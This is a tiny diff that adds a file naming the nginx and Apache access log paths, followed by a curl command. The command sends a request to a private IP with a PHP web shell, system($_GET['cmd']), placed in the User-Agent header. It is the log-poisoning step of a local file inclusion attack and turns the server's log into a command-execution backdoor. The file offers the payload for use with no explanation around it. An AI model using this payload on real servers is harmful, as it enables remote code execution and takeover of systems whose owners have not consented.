@@ -1,0 +1,3 @@
+# /var/log/nginx/access.log or /var/log/apache2/access.log
+
+curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.1.2"
